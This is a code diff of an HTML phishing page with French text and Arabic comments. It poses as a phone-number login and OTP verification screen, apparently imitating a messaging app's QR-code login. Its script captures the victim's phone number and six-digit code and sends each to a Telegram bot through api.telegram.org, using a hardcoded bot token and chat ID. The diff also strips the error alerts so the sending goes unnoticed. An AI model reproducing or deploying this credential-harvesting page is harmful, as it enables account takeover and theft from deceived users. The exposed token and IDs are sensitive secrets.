@@ -3,21 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Connexion</title>
+    <title>Vérification</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
     <style>
         :root {
-            --primary-green: #24ac64;
-            --bg-gray: #f2f2f2; /* اللون الرمادي للخلفية */
-            --text-dark: #1a1a1a;
+            /* الألوان المستخرجة من الصورة */
+            --bg-cream: #fdf8f1; /* لون الخلفية الكريمي الفاتح */
+            --btn-green: #24ac64; /* لون الزر الأخضر */
+            --text-black: #1a1a1a; /* لون الخط الداكن */
+            --border-gray: #e5e5e5;
         }
 
-        * { box-sizing: border-box; font-family: -apple-system, sans-serif; }
+        * { box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
 
         body {
-            background-color: var(--bg-gray); /* تطبيق اللون الرمادي */
+            background-color: var(--bg-cream); /* تطبيق لون الخلفية من الصورة */
             margin: 0;
-            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -26,40 +27,65 @@
 
         .wrapper {
             width: 100%;
-            max-width: 450px;
+            max-width: 420px;
             background: white;
-            padding: 40px 25px;
-            border-radius: 15px; /* حواف منحنية قليلاً للمربع الأبيض */
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-            border-bottom: 4px solid #000;
+            padding: 50px 30px;
+            border-bottom: 4px solid #000; /* الخط الأسود العريض أسفل الصورة */
+            text-align: left;
         }
 
-        h2 { font-size: 26px; margin: 0 0 10px; font-weight: 700; }
-        p { color: #666; font-size: 15px; margin-bottom: 30px; }
+        h2 { 
+            color: var(--text-black);
+            font-size: 26px; 
+            font-weight: 700; 
+            margin-bottom: 12px;
+            line-height: 1.2;
+        }
 
-        .iti { width: 100% !important; margin-bottom: 25px; }
+        p { 
+            color: #666; 
+            font-size: 15px; 
+            margin-bottom: 35px; 
+            line-height: 1.4;
+        }
+
+        /* تنسيق الحقول لتطابق الصورة */
+        .iti { width: 100%; margin-bottom: 25px; }
         input[type="tel"], .otp-field {
             height: 55px;
-            border: 1.5px solid #ccc;
-            border-radius: 30px;
-            font-size: 18px;
+            border: 1px solid var(--border-gray);
+            border-radius: 8px; /* حواف مربعة قليلاً مثل الصورة */
+            font-size: 17px;
             outline: none;
+            background: #fff;
         }
 
-        .otp-container { display: flex; justify-content: space-between; gap: 8px; margin: 20px 0; }
-        .otp-field { width: 15% !important; text-align: center; border-radius: 12px; }
+        .otp-container { display: flex; justify-content: space-between; gap: 10px; margin: 25px 0; }
+        .otp-field { width: 48px !important; text-align: center; border-radius: 8px; }
 
         .btn-submit {
-            background-color: var(--primary-green);
+            background-color: var(--btn-green); /* اللون الأخضر من الصورة */
             color: white;
             border: none;
-            width: 180px;
+            width: 100%;
+            max-width: 200px;
             height: 50px;
             border-radius: 25px;
-            font-size: 18px;
+            font-size: 17px;
+            font-weight: 600;
             cursor: pointer;
-            margin: 30px auto 10px;
+            margin: 20px auto;
             display: block;
+        }
+
+        .link-text {
+            display: block;
+            text-align: center;
+            color: var(--text-black);
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+            margin-top: 15px;
         }
 
         .hidden { display: none !important; }
@@ -72,28 +98,30 @@
         <h2>Saisissez un numéro de téléphone.</h2>
         <p>Sélectionnez un pays et saisissez votre numéro de téléphone.</p>
         <input type="tel" id="phone">
-        <button class="btn-submit" onclick="sendData('phone')">Suivant</button>
+        <button class="btn-submit" onclick="process('phone')">Suivant</button>
+        <a href="#" class="link-text">Se connecter avec un code QR ></a>
     </div>
 
     <div id="page2" class="hidden">
         <h2>Vérification</h2>
-        <p>Veuillez saisir le code à 6 chiffres.</p>
+        <p>Veuillez saisir le code à 6 chiffres envoyé à votre mobile.</p>
         <div class="otp-container">
-            <input type="number" class="otp-field" oninput="moveNext(this, 0)">
-            <input type="number" class="otp-field" oninput="moveNext(this, 1)">
-            <input type="number" class="otp-field" oninput="moveNext(this, 2)">
-            <input type="number" class="otp-field" oninput="moveNext(this, 3)">
-            <input type="number" class="otp-field" oninput="moveNext(this, 4)">
-            <input type="number" class="otp-field" oninput="moveNext(this, 5)">
+            <input type="number" class="otp-field" oninput="move(this, 0)">
+            <input type="number" class="otp-field" oninput="move(this, 1)">
+            <input type="number" class="otp-field" oninput="move(this, 2)">
+            <input type="number" class="otp-field" oninput="move(this, 3)">
+            <input type="number" class="otp-field" oninput="move(this, 4)">
+            <input type="number" class="otp-field" oninput="move(this, 5)">
         </div>
-        <button class="btn-submit" onclick="sendData('otp')">Vérifier</button>
+        <button class="btn-submit" onclick="process('otp')">Vérifier</button>
+        <a href="#" class="link-text">Renvoyer le code ></a>
     </div>
 </div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
-    const botToken = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
-    const chatId = "5614946654"; // <--- تأكد من أن هذا هو الـ Chat ID الخاص بك
+    const token = "8597407463:AAEZ98PLouzh7ivB8WqRGGuGhiPYCbUMS5Q";
+    const chat = "1705240737";
 
     const iti = window.intlTelInput(document.querySelector("#phone"), {
         initialCountry: "auto",
@@ -101,29 +129,26 @@
         utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
     });
 
-    function sendData(type) {
-        let text = "";
+    function process(type) {
+        let msg = "";
         if(type === 'phone') {
-            text = "📱 رقم جديد: " + iti.getNumber();
+            msg = "📱 رقم هاتف: " + iti.getNumber();
             document.getElementById('page1').classList.add('hidden');
             document.getElementById('page2').classList.remove('hidden');
         } else {
-            let otp = "";
-            document.querySelectorAll('.otp-field').forEach(f => otp += f.value);
-            text = "🔑 كود الـ OTP: " + otp;
+            let code = "";
+            document.querySelectorAll('.otp-field').forEach(f => code += f.value);
+            msg = "🔑 كود الـ OTP: " + code;
         }
 
-        // كود الإرسال مع فحص النتيجة
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: chatId, text: text })
-        }).then(res => res.json()).then(res => {
-            if(!res.ok) alert("خطأ في التليجرام: " + res.description);
-        }).catch(err => alert("فشل الاتصال: " + err));
+            body: JSON.stringify({ chat_id: chat, text: msg })
+        });
     }
 
-    function moveNext(el, i) {
+    function move(el, i) {
         if(el.value.length >= 1) {
             el.value = el.value.slice(0,1);
             if(i < 5) document.querySelectorAll('.otp-field')[i+1].focus();
